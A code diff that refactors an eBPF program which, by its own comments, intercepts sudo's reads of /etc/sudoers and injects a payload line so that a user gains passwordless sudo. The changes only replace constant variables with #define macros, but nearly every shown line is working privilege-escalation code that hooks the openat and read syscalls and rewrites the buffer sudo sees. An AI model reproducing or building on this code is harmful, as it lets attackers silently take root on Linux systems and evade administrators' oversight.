@@ -40,9 +40,15 @@ const volatile int uid = 0;
 // add to /etc/sudoers when viewed by sudo
 // Which makes it think our user can sudo
 // without a password
+#define MAX_PAYLOAD_LEN 100
 const int max_payload_len = 100;
 const volatile int payload_len = 0;
-const volatile char payload[max_payload_len];
+const volatile char payload[MAX_PAYLOAD_LEN];
+
+// Const length of string "sudo"
+#define SUDO_LEN 5
+// Const length of string "/etc/sudoers"
+#define SUDOERS_LEN 13
 
 SEC("tp/syscalls/sys_enter_openat")
 int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
@@ -62,20 +68,18 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
     // Check comm is sudo
     char comm[TASK_COMM_LEN];
     bpf_get_current_comm(comm, sizeof(comm));
-    const int sudo_len = 5;
     const char *sudo = "sudo";
-    for (int i = 0; i < sudo_len; i++) {
+    for (int i = 0; i < SUDO_LEN; i++) {
         if (comm[i] != sudo[i]) {
             return 0;
         }
     }
 
     // Now check we're opening sudoers
-    const int sudoers_len = 13;
     const char *sudoers = "/etc/sudoers";
-    char filename[sudoers_len];
-    bpf_probe_read_user(&filename, sudoers_len, (char*)ctx->args[1]);
-    for (int i = 0; i < sudoers_len; i++) {
+    char filename[SUDOERS_LEN];
+    bpf_probe_read_user(&filename, SUDOERS_LEN, (char*)ctx->args[1]);
+    for (int i = 0; i < SUDOERS_LEN; i++) {
         if (filename[i] != sudoers[i]) {
             return 0;
         }
@@ -173,7 +177,7 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
     // then add '#'s to comment out rest of data in the chunk.
     // This sorta corrupts the sudoers file, but everything still
     // works as expected
-    char local_buff[max_payload_len] = { 0x00 };
+    char local_buff[MAX_PAYLOAD_LEN] = { 0x00 };
     bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
     for (unsigned int i = 0; i < max_payload_len; i++) {
         if (i >= payload_len) {
